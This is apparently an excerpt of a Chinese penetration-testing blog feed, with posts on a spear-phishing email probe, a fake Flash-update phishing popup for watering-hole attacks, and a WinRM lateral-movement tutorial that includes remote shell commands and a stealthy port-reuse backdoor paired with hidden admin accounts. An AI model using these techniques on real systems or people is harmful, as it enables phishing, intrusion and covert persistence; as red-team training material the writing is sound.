src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304005231210.png"></p><h2 id="三种小调和大调的关系"><a href="#三种小调和大调的关系" class="headerlink" title="三种小调和大调的关系"></a>三种小调和大调的关系</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304005329719.png"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;乐理基础学习笔记。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="乐理基础" scheme="https://www.se7ensec.cn/tags/%E4%B9%90%E7%90%86%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>2020年度总结</title>
    <link href="https://www.se7ensec.cn/2021/01/30/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://www.se7ensec.cn/2021/01/30/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
    <published>2021-01-29T17:16:18.000Z</published>
    <updated>2021-09-27T11:33:05.795Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="cb11856a4897e7fc052c442efe3fc22364a64b10146d15984104d66e27290427">ff41d9ed7da0c90bb8315e296c2afdc7e5ee23f1c3e49d2449c84df883ef80e7f3e4ffff36be0b9a51ad072802f294a5efd4fd268166a5cba83ce0fce882680f287ddb4c54b0c4532a7ddcad5eb9c573c6bb64efaafb02562e9ffcf4522630252c90aad4047d37775cae6601b1885e2e76878db60da51a9303fe5b8268540fbfa5e4a3a8a3805ab3bb63d08e17704a1278825317c0dec3dbfa14349fe6f85bff1485d90b6fc07f2a61de713404035785efb9df37b52df0c88d0efc9f8fdfe7ecdf88d3c065b601a2c9744a2d98ed93717e83ed2802139b43db8613911049b8b1fd82bfc9abdc4e3ac70a70479c1d3f7375d80a846e23e33209fc02fb1dedad7981b4d84c2e708ba44739b17eb730180e1d61de840633cb7839fd4ed55c2b2757247b596428d235357dbedce6a2d539da9dfc46278590a6f1fdc0752da647093e9efb91ce7244fa4c575992be05c7314d3aadabb273fa2751c137d6ea2e7976b17f3406d92d7fa7f73e9e2523029f20e51dcbb992a7169d904cc0b285326dc32eb47c71c92f0bccbd38392e3ee3168de2502a845e9ae080f0e404ffa46dadc767133d5dbf17ddd9d47b88d50c301e578c54b48c413471caa35bd0ca211cd476677efd16ca064b40a2a655ccc2977d70cb7489f67d92c2ba2032889f9d5e03eec14d8e4b4d43ccea49c948aad45cf77cfa4e793006b5fae55547f2cbdcbb362042219ba9f55bb419500d393aeb957652a88fe0d9a61bd6bbc353e50ba81dbf6291379ee628ef5000d494dd13a31a9c13a05e3a5b3455b2fdae2990eca457bcfacb0abd79b10a42a5b686b5e85f1586fe691658c9a43a10dc41120131ec4794f1896f0ab7a00041b13b61966d0b381729515b4d3d77c1c11a6e8728f43e3821796cd5679eeef0ede6b94a3e71eeeb13838773802d1b7660eacc64bdc026e428674b5b9d31ed2e994fba587e0604260adb65d80ae325eae422ac0b3fe4da4f5dacea2911226080c1cb5279acaa48c1a050b580dc63c539b409962bb869b75d3386bba230a24033ccbcc9ed3ea9d65dc4fe54e37bb1596fc5f2853dbec77670110375f52f974c2c3015cc62d10aaec01e1b286c60da8abe59040ea2631b50e131cf2b86c4a0636f47719931b21a5288d7d63b24250d9f72da67890b6f5f0f15efc7fb14580b10c9f88676846df8a83db5a5bdfa0242d486a1c84b5160b7e4a6f4f3b31eed7405f4c7f4fea6c32816cbc24adacf63d8ade469219cdd109167ca5597fe80ea37b979a507f02523082a508812f1604772c85e1b8c94acd6d35a8b963a34d4d83c82b9e97d6f0cc110de131106ac70a35118221d852a3c75029c3c683176c2fe4d50d9880a0d71a1cdb66d88f5a0bf145865a9905d44fc7530ae84685f6341be31e3587e965351bb4745f746d305d0e91d24febcaf91a68f7ef698be7e27fbd71881a28ba906a2df5501aa1de2a88cec459bc0aadc1c3ce83e612030d3b0f48677eddfaf738fd9559835ad7e1702aa048502935c25aedfb043a8b160284325e11ad8b8b401f8bc03b0e5fb4d155ce4a6219f7dff1007a8e2402c642baaa5d1b73bc04cd4d8760b296b30c37982df47fbd594f2f8dbaf3d8a84d0df96210ac0d5161854c8c98c05e33eb0879308cfee0937d477e121326e00b0d210c592610d7c448eeaf9a427bb52d42b164c6fff37ec24bbe43064ce6a406c492675d0c30c748810198b36290a63ddfcf847a3e231a7d268cf44f9cec3005ebed3178f5e</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>一星期实战总结（四）</title>
    <link href="https://www.se7ensec.cn/2020/11/17/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%934/"/>
    <id>https://www.se7ensec.cn/2020/11/17/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%934/</id>
    <published>2020-11-17T02:30:24.000Z</published>
    <updated>2021-06-19T09:13:22.116Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9ffb4db8a356ec55a75a6728349685c159ad1a2f40e3f83ca045a2edad5d9b36"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="一星期实战总结" scheme="https://www.se7ensec.cn/tags/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>鱼叉攻击|Mail-Probe 邮箱探针后台管理系统</title>
    <link href="https://www.se7ensec.cn/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <id>https://www.se7ensec.cn/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</id>
    <published>2020-09-30T04:10:24.000Z</published>
    <updated>2021-01-29T16:12:09.939Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>好的鱼竿和诱饵固然重要，但真正把鱼儿和渔夫联系起来的是小小的浮漂。</p></blockquote><a id="more"></a><h1 id="效果预览"><a href="#效果预览" class="headerlink" title="效果预览"></a>效果预览</h1><p>平常去河边钓鱼，要使用浮漂才会知道这条河是否有鱼吃饵料，同理当邮件投递出去后，此探针可以判断目标是否点击了邮件，不至于那么的苦等。</p><h2 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h2><p><img src="https://gitee.com/r00tSe7en/Mail-Probe/raw/master/tz0.png"></p><h2 id="信息查看"><a href="#信息查看" class="headerlink" title="信息查看"></a>信息查看</h2><p><img src="https://gitee.com/r00tSe7en/Mail-Probe/raw/master/tz1.png"></p><h2 id="链接生成"><a href="#链接生成" class="headerlink" title="链接生成"></a>链接生成</h2><p>本程序通过php中的readfile() 函数读取本地图片，如使用自定义图片请替换public目录下的info.png，这里的图片可以使用目标公司的logo。</p><p><img src="https://gitee.com/r00tSe7en/Mail-Probe/raw/master/tz2.png"></p><h1 id="配置相关"><a href="#配置相关" class="headerlink" title="配置相关"></a>配置相关</h1><blockquote><p>基于ThinkPHP 6开发</p></blockquote><blockquote><p>运行环境要求Apache和PHP7.1+</p></blockquote><blockquote><p>数据库文件为mail.sql</p></blockquote><p>数据库及其他配置修改env文件即可，默认为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">APP_DEBUG &#x3D; false</span><br><span class="line"></span><br><span class="line">[APP]</span><br><span class="line">DEFAULT_TIMEZONE &#x3D; Asia&#x2F;Shanghai</span><br><span class="line"></span><br><span class="line">[DATABASE]</span><br><span class="line">TYPE &#x3D; mysql</span><br><span class="line">HOSTNAME &#x3D; 127.0.0.1</span><br><span class="line">DATABASE &#x3D; mail</span><br><span class="line">USERNAME &#x3D; root</span><br><span class="line">PASSWORD &#x3D; root</span><br><span class="line">HOSTPORT &#x3D; 3306</span><br><span class="line">CHARSET &#x3D; utf8</span><br><span class="line">DEBUG &#x3D; false</span><br><span class="line"></span><br><span class="line">[LANG]</span><br><span class="line">default_lang &#x3D; zh-cn</span><br></pre></td></tr></table></figure><p>后台默认账号密码（密码修改直接替换库中MD5即可）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin|123456</span><br></pre></td></tr></table></figure><h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><a href="https://github.com/r00tSe7en/Mail-Probe">  <img align="center" src="https://github-readme-stats.vercel.app/api/pin/?username=r00tSe7en&theme=dracula&repo=Mail-Probe" /></a><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p><a href="https://github.com/c1y2m3">@c1y2m3</a> 分享的思路</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;好的鱼竿和诱饵固然重要，但真正把鱼儿和渔夫联系起来的是小小的浮漂。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="JavaScript" scheme="https://www.se7ensec.cn/tags/JavaScript/"/>
    
    <category term="PHP" scheme="https://www.se7ensec.cn/tags/PHP/"/>
    
    <category term="鱼叉攻击" scheme="https://www.se7ensec.cn/tags/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>水坑攻击|Flash钓鱼弹窗优化版</title>
    <link href="https://www.se7ensec.cn/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/"/>
    <id>https://www.se7ensec.cn/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/</id>
    <published>2020-09-14T04:10:24.000Z</published>
    <updated>2021-01-23T14:13:50.659Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>还是那句话：Flash永远滴神~</p></blockquote><a id="more"></a><p>一直想写个界面精致点的Flash钓鱼，奈何各种效果实现起来实在是有点麻烦，正好发现了layer这个牛逼的弹层组件，一开始直接用的图片，几行代码就搞定了，但是还是不够完美，后来发到T00ls大家集思广益，提出了一些非常好的建议，几次修改后才有了如下的最终版。</p><p>在线预览：<a href="http://flash-pop.se7ensec.cn/">http://flash-pop.se7ensec.cn/</a></p><p>有人说flash不好用了，感觉分析好对面是干啥的，做好一些自动化、定制化的工作，上线率其实还是挺高的。</p><p>项目地址：<a href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;还是那句话：Flash永远滴神~&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="JavaScript" scheme="https://www.se7ensec.cn/tags/JavaScript/"/>
    
    <category term="HTML" scheme="https://www.se7ensec.cn/tags/HTML/"/>
    
    <category term="水坑攻击" scheme="https://www.se7ensec.cn/tags/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于winRM的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-08-26T14:10:24.000Z</published>
    <updated>2021-06-19T08:21:44.014Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于winRM的横向移动</p></blockquote><a id="more"></a><h2 id="winRM简介"><a href="#winRM简介" class="headerlink" title="winRM简介"></a>winRM简介</h2><p>WinRM(Windows Remote Management)是 Microsoft 对 WS-Management 协议的实现，WS-Management 协议即一种基于标准简单对象访问协议（soap）的防火墙友好协议，它让来自不同供应商的硬件和操作系统能够相互操作。windows 众多可以远程执行命令方式中的一种。 </p><p>作为DCOM和WMI远程管理的替代方法，WinRM用于通过WSMan与远程计算机建立会话，WSMan利用HTTP/S作为传输机制来传递XML格式的消息。在现代Windows系统中，WinRM HTTP通过TCP端口5985进行通信，而HTTPS（TLS）通过TCP端口5986进行通信。</p><p>WinRM本机支持NTLM和Kerberos（域）身份验证。初始身份验证后，WinRM会话将使用AES加密（<a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/winrmsecurity?view=powershell-7">Microsoft Docs</a>）保护。</p><p>注意：必须配置并运行WinRM服务才能接受远程连接。WinRM接受连接可能还需要几个步骤。请参阅这篇 <a href="https://pentestlab.blog/2018/05/15/lateral-movement-winrm/">Pentest Lab 文章</a> 以了解更多信息。</p><p><strong>※ winRM横向移动同时适用于工作组和域环境。</strong> </p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><h3 id="通信的双方都需要开启WinRM服务"><a href="#通信的双方都需要开启WinRM服务" class="headerlink" title="通信的双方都需要开启WinRM服务"></a>通信的双方都需要开启WinRM服务</h3><p>WinRS 适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。</p><p>只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。</p><p>WinRM状态查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> win32_service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.name <span class="operator">-like</span> <span class="string">&quot;WinRM&quot;</span>&#125;                    </span><br><span class="line"></span><br><span class="line">ExitCode  : <span class="number">1077</span></span><br><span class="line">Name      : WinRM</span><br><span class="line">ProcessId : <span class="number">0</span></span><br><span class="line">StartMode : Manual</span><br><span class="line">State     : Stopped</span><br><span class="line">Status    : OK</span><br></pre></td></tr></table></figure><p>开启可以使用下面其中一条命令即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig <span class="literal">-q</span> <span class="comment">#这条命令运行后会自动添加防火墙例外规则，放行5985端口。</span></span><br><span class="line"><span class="built_in">Enable-PSRemoting</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>再次查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> win32_service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.name <span class="operator">-like</span> <span class="string">&quot;WinRM&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">ExitCode  : <span class="number">0</span></span><br><span class="line">Name      : WinRM</span><br><span class="line">ProcessId : <span class="number">1128</span></span><br><span class="line">StartMode : Auto</span><br><span class="line">State     : Running</span><br><span class="line">Status    : OK</span><br></pre></td></tr></table></figure><h3 id="服务端防火墙允许WinRM服务端口通信"><a href="#服务端防火墙允许WinRM服务端口通信" class="headerlink" title="服务端防火墙允许WinRM服务端口通信"></a>服务端防火墙允许WinRM服务端口通信</h3><p>默认为5985、5986；如果5985打开，但是5986关闭，标识WinRM服务配置为仅接受HTTP连接。修改默认端口可以使用如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Listener?Address=*+Transport=HTTP <span class="selector-tag">@</span>&#123;Port=<span class="string">&quot;80&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="WinRM通信两端配置要求"><a href="#WinRM通信两端配置要求" class="headerlink" title="WinRM通信两端配置要求"></a>WinRM通信两端配置要求</h3><p>1）查看WinRM具体配置</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm get winrm/config</span><br></pre></td></tr></table></figure><p>2）允许所有客户端IP连接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Client <span class="selector-tag">@</span>&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line">winrm e winrm/config/listener <span class="comment">#查看监听地址和端口</span></span><br></pre></td></tr></table></figure><h2 id="远程管理"><a href="#远程管理" class="headerlink" title="远程管理"></a>远程管理</h2><p>远程连接时可能会遇到以下错误</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Winrs error:WinRM 客户端无法处理该请求。可以在下列条件下将默认身份验证与 IP 地址结合使用: 传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 有关如何设置 TrustedHosts 的详细信息，请运行以下命令: winrm help config。</span><br><span class="line"></span><br><span class="line">Winrs error:WinRM 客户端无法处理该请求。如果身份验证方案与 Kerberos 不同，或者客户端计算机未加入到域中，则必须使用 HTTPS 传输或者必须将目标计算机添加到 TrustedHosts 配置设置。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 通过运行以下命令 可获得有关此内容的更多信息: winrm help config。</span><br></pre></td></tr></table></figure><p>在你的攻击机上执行下面这条命令，设置为信任所有主机，再去连接即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrm <span class="built_in">set</span> winrm/config/Client <span class="selector-tag">@</span>&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line"> Client</span><br><span class="line">    NetworkDelayms = <span class="number">5000</span></span><br><span class="line">    URLPrefix = wsman</span><br><span class="line">    AllowUnencrypted = false</span><br><span class="line">    Auth</span><br><span class="line">        Basic = true</span><br><span class="line">        Digest = true</span><br><span class="line">        Kerberos = true</span><br><span class="line">        Negotiate = true</span><br><span class="line">        Certificate = true</span><br><span class="line">        CredSSP = false</span><br><span class="line">    DefaultPorts</span><br><span class="line">        HTTP = <span class="number">5985</span></span><br><span class="line">        HTTPS = <span class="number">5986</span></span><br><span class="line">    TrustedHosts = *</span><br></pre></td></tr></table></figure><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% whoami</span></span><br><span class="line">win<span class="literal">-win7</span>\administrator</span><br></pre></td></tr></table></figure><h3 id="获取交互式的shell"><a href="#获取交互式的shell" class="headerlink" title="获取交互式的shell"></a>获取交互式的shell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% cmd</span></span><br><span class="line">Microsoft Windows [版本 <span class="number">6.1</span><span class="type">.7601</span>]</span><br><span class="line">版权所有 (c) <span class="number">2009</span> Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line">以太网适配器 本地连接:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">95</span>c8:a481:b587:<span class="number">2</span>d7c%<span class="number">11</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">86.114</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">86.1</span></span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.&#123;<span class="number">993</span>CBC2D<span class="literal">-5164</span><span class="literal">-415A</span><span class="literal">-A70E</span><span class="literal">-00FF0F6119D5</span>&#125;:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><h4 id="WSMan-WinRM"><a href="#WSMan-WinRM" class="headerlink" title="WSMan-WinRM"></a>WSMan-WinRM</h4><p> 使用WSMan.Automation COM对象通过WinRM执行远程命令。 </p><p> <a href="https://github.com/bohops/WSMan-WinRM">https://github.com/bohops/WSMan-WinRM</a> </p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="center">使用教程</th></tr></thead><tbody><tr><td align="left">Winrm爆破</td><td align="left">5985/5986端口</td><td align="left">Windows</td><td align="center"><a href="http://k8gege.org/Ladon/WinrmScan.html">http://k8gege.org/Ladon/WinrmScan.html</a></td></tr><tr><td align="left">WinrmExec</td><td align="left">5985</td><td align="left">Windows</td><td align="center"><a href="http://k8gege.org/Ladon/WinrmExec.html">http://k8gege.org/Ladon/WinrmExec.html</a></td></tr></tbody></table><h2 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a>其他利用</h2><h3 id="开启远程主机3389"><a href="#开启远程主机3389" class="headerlink" title="开启远程主机3389"></a>开启远程主机3389</h3><p>如果目标开启了WinRM可以利用<a href="https://github.com/Viralmaniar/PeekABoo">PeekABoo</a>工具使目标开启3389</p><h3 id="端口复用后门"><a href="#端口复用后门" class="headerlink" title="端口复用后门"></a>端口复用后门</h3><p>将WinRM监听端口由5985改为80或者443，即使端口被web服务也不影响，并且不影响web服务。利用如下</p><p>1）配置目标WinRM服务，更改监听端口开启复用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Listener?Address=*+Transport=HTTP <span class="selector-tag">@</span>&#123;Port=<span class="string">&quot;80&quot;</span>&#125;</span><br><span class="line">winrm <span class="built_in">set</span> winrm/config/service <span class="selector-tag">@</span>&#123;EnableCompatibilityHttpListener=<span class="string">&quot;true&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>2）链接目标</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% whoami</span></span><br></pre></td></tr></table></figure><p>该方法适用于有web服务的机器，不会开启新的端口，配合添加隐藏管理员用户，隐蔽性极高。</p><h2 id="参考引用："><a href="#参考引用：" class="headerlink" title="参考引用："></a>参考引用：</h2><p> <a href="http://t3ngyu.leanote.com/post/LM-WinRM-WinRS">http://t3ngyu.leanote.com/post/LM-WinRM-WinRS</a></p><p> <a href="https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/">https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/</a></p><p> <a href="https://xz.aliyun.com/t/6888">https://xz.aliyun.com/t/6888</a></p><p> <a href="https://www.cnblogs.com/-mo-/p/12019314.html">https://www.cnblogs.com/-mo-/p/12019314.html</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于winRM的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>在线肾透测试中心</title>
    <link href="https://www.se7ensec.cn/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/"/>
    <id>https://www.se7ensec.cn/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/</id>
    <published>2020-08-24T14:10:24.000Z</published>
    <updated>2021-11-02T14:46:51.848Z</updated>
    
